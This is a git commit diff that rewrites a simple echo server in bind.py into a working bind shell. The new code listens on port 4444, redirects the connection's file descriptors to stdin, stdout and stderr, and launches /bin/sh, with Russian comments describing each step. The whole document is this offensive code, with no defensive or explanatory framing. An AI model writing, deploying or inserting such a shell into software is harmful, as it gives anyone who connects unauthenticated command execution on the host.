eb8cbb8aad3ebe30cf88b971ad1e76a57d57c0e8
h00kmeat <danil.sid2015@gmail.com>
2024-08-10 04:07:02 +0300

    a

--- bind.py
+++ bind.py
@@ -1,17 +1,20 @@
 import socket
+import os
 
-def start_listener(host='0.0.0.0', port=4444):
+def bind_shell(host='0.0.0.0', port=4444):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((host, port))
         s.listen(1)
         print(f'Listening on {host}:{port}...')
         conn, addr = s.accept()
-        with conn:
-            print(f'Connection from {addr}')
-            while True:
-                data = conn.recv(1024)
-                if not data:
-                    break
-                conn.sendall(data)
+        print(f'Connection from {addr}')
+        
+        # Дублируем файловые дескрипторы соединения на stdin, stdout и stderr
+        os.dup2(conn.fileno(), 0)
+        os.dup2(conn.fileno(), 1)
+        os.dup2(conn.fileno(), 2)
 
-start_listener()
+        # Открываем командную оболочку
+        os.system('/bin/sh')
+
+bind_shell()
